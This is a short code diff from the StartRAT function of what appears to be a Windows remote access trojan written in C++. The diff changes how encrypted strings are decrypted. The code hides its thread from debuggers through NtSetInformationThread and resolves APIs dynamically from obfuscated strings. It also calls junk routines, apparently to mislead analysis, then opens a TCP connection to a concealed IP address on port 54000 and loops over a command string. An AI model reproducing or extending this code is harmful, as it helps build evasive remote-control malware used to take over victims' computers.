@@ -33,18 +33,18 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 	// or in the resolve_dynamically: resolve_dynamically<GetCurrentThread_t>(arrayToCStr(str_GetCurrentThread_encrypt));
 
 	
-	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(string_decrypt(str_GetCurrentThread, str_GetCurrentThread_len).c_str());
-	resolve_dynamically<NtSetInformationThread_t>(string_decrypt(str_NtSetInformationThread, str_NtSetInformationThread_len).c_str(), string_decrypt_cstr(str_ntdll, str_ntdll_len))(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
+	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(str_GetCurrentThread);
+	resolve_dynamically<NtSetInformationThread_t>(str_NtSetInformationThread, str_ntdll)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
 
 	suspicious_junk_3();
 
-	TCPClient* conn = new TCPClient(string_decrypt(str_ip, str_ip_len), 54000);
+	TCPClient* conn = new TCPClient(&str_ip, 54000);
 	conn->start_connection();
 
 	std::string commandLine = "";
 	while (true)
 	{
-		commandLine = string_decrypt(str_cmd, str_cmd_len);
+		commandLine = string_decrypt(str_cmd);
 
 		suspicious_junk_1();
 
